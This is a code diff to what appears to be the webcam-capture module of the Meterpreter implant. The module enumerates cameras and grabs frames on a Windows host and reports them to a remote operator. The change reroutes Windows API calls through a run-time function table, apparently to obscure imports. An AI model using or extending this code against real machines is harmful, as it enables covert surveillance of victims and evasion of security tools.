@@ -94,7 +94,7 @@ public:
 			imgdata = (PBYTE)malloc(imgsize);
 		}
 		memcpy(imgdata, pBuffer, imgsize);
-		SetEvent(writeEvent); //Notify of new frame
+		met_api->win_api.kernel32.SetEvent(writeEvent); //Notify of new frame
 		return S_OK;
 	}
 	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
@@ -167,8 +167,8 @@ DWORD webcam_start(WebcamThreadState* state)
 			BREAK_WITH_ERROR("[WEBCAM] No webcams found", ERROR_FILE_NOT_FOUND);
 		}
 
-		CoInitialize(NULL);
-		hr = CoCreateInstance(CLSID_SystemDeviceEnum,
+		met_api->win_api.ole32.CoInitialize(NULL);
+		hr = met_api->win_api.ole32.CoCreateInstance(CLSID_SystemDeviceEnum,
 			NULL,
 			CLSCTX_INPROC,
 			IID_ICreateDevEnum,
@@ -215,7 +215,7 @@ DWORD webcam_start(WebcamThreadState* state)
 		dprintf("[WEBCAM] Creating state->pGraphBuilder");
 
 		// Build all the necessary interfaces to start the capture
-		hr = CoCreateInstance(CLSID_FilterGraph,
+		hr = met_api->win_api.ole32.CoCreateInstance(CLSID_FilterGraph,
 			NULL,
 			CLSCTX_INPROC,
 			IID_IGraphBuilder,
@@ -232,7 +232,7 @@ DWORD webcam_start(WebcamThreadState* state)
 			BREAK_WITH_ERROR("[WEBCAM] Query interface failed", hr);
 		}
 
-		hr = CoCreateInstance(CLSID_CaptureGraphBuilder2,
+		hr = met_api->win_api.ole32.CoCreateInstance(CLSID_CaptureGraphBuilder2,
 			NULL,
 			CLSCTX_INPROC,
 			IID_ICaptureGraphBuilder2,
@@ -262,7 +262,7 @@ DWORD webcam_start(WebcamThreadState* state)
 		}
 
 		// Create a SampleGrabber
-		hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterSampleGrabber);
+		hr = met_api->win_api.ole32.CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterSampleGrabber);
 		if (FAILED(hr)) {
 			BREAK_WITH_ERROR("[WEBCAM] Create sample grabber failed", hr);
 		}
@@ -300,7 +300,7 @@ DWORD webcam_start(WebcamThreadState* state)
 		}
 
 		// Create the NullRender
-		hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterNullRenderer);
+		hr = met_api->win_api.ole32.CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterNullRenderer);
 		if (FAILED(hr)) {
 			BREAK_WITH_ERROR("[WEBCAM] Create the NullRender failed", hr);
 		}
@@ -348,7 +348,7 @@ DWORD webcam_start(WebcamThreadState* state)
 		}
 
 		//Sync: set up semaphore
-		writeEvent = CreateEvent(
+		writeEvent = met_api->win_api.kernel32.CreateEventA(
 			NULL,               // default security attributes
 			FALSE,               // auto-reset event
 			FALSE,              // initial state is nonsignaled
@@ -371,11 +371,11 @@ DWORD webcam_start(WebcamThreadState* state)
 		}
 
 		//Now we wait for first frame
-		if (WaitForSingleObject(writeEvent, 30000) == WAIT_TIMEOUT) {
+		if (met_api->win_api.kernel32.WaitForSingleObject(writeEvent, 30000) == WAIT_TIMEOUT) {
 			BREAK_WITH_ERROR("[WEBCAM] timeout!", WAIT_TIMEOUT);
 		}
 
-		dwResult = GetLastError();
+		dwResult = met_api->win_api.kernel32.GetLastError();
 	} while (0);
 
 	return dwResult;
@@ -464,7 +464,7 @@ DWORD THREADCALL webcam_control_thread(THREAD * thread)
 
 	dprintf("[WEBCAM] Entry.");
 	state->bRunning = TRUE;
-	CoInitialize(NULL);
+	met_api->win_api.ole32.CoInitialize(NULL);
 
 	do
 	{
@@ -539,7 +539,7 @@ DWORD THREADCALL webcam_control_thread(THREAD * thread)
 		state->pGraphBuilder = NULL;
 	}
 
-	CoUninitialize();
+	met_api->win_api.ole32.CoUninitialize();
 
 	state->dwResult = dwResult;
 
@@ -569,8 +569,8 @@ extern "C" {
 			IEnumMoniker* pclassEnum = NULL;
 			ICreateDevEnum* pdevEnum = NULL;
 
-			CoInitialize(NULL);
-			HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,
+			met_api->win_api.ole32.CoInitialize(NULL);
+			HRESULT hr = met_api->win_api.ole32.CoCreateInstance(CLSID_SystemDeviceEnum,
 				NULL,
 				CLSCTX_INPROC,
 				IID_ICreateDevEnum,
@@ -599,7 +599,7 @@ extern "C" {
 				if (SUCCEEDED(hr)) {
 					// To retrieve the filter's friendly name, do the following:
 					VARIANT varName;
-					VariantInit(&varName);
+					met_api->win_api.oleaut32.VariantInit(&varName);
 					hr = pPropBag->Read(L"FriendlyName", &varName, 0);
 
 					if (SUCCEEDED(hr) && varName.vt == VT_BSTR) {
@@ -611,7 +611,7 @@ extern "C" {
 						met_api->packet.add_tlv_string(response, TLV_TYPE_WEBCAM_NAME, charbuf);
 					}
 
-					VariantClear(&varName);
+					met_api->win_api.oleaut32.VariantClear(&varName);
 					pPropBag->Release();
 
 					nCount++;
@@ -621,11 +621,11 @@ extern "C" {
 			pclassEnum->Release();
 		} while (0);
 
-		dwResult = GetLastError();
+		dwResult = met_api->win_api.kernel32.GetLastError();
 
 		met_api->packet.transmit_response(dwResult, remote, response);
 
-		CoUninitialize();
+		met_api->win_api.ole32.CoUninitialize();
 		return dwResult;
 	}
 
